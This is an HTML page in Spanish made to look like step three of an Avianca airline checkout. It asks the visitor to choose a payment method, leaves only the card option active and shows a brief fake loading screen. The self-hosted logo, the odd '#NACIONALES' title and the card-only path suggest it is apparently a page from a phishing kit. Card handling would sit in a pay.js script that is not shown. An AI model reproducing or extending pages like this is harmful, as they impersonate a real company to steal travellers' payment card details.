<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <p class="title">Selecciona tu método de pago</p>
        <p class="text_info">Debes dar click al metodo con el cual deseas pagar.</p>

        <div class="card_metodo" onclick="siguiente();">
            <div class="head_metodo">
                <p>Tarjeta de crédito o débito</p>
                <img src="media/metodos.png" alt="">
            </div>
        </div>

        <div class="card_metodo card_metodo_inactivo">
            <div class="head_metodo">
                <p>PSE (INACTIVO)</p>
            </div>
        </div>
    </div>



</body>



<script src="js/jquery-3.7.1.min.js"></script>
<script src="js/pay.js"></script>
<div class="loader_inicial" id="loaderI">
    <img src="media/loading.png" alt="">
    <div class="lds-ring">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
    </div>
</div>

<script>
    setTimeout(function() {
        $('#loaderI').hide();
    }, 3000);
</script>
</html>